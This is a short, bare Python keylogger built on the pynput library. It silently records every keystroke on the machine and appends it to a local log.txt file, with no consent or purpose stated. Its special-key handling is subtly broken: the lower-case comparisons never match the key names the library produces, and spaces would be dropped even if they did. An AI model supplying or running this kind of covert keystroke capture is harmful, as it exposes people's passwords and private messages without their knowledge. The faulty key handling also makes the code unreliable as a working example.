from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'key.space':
        key = ''
    if key == 'key.enter':
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()
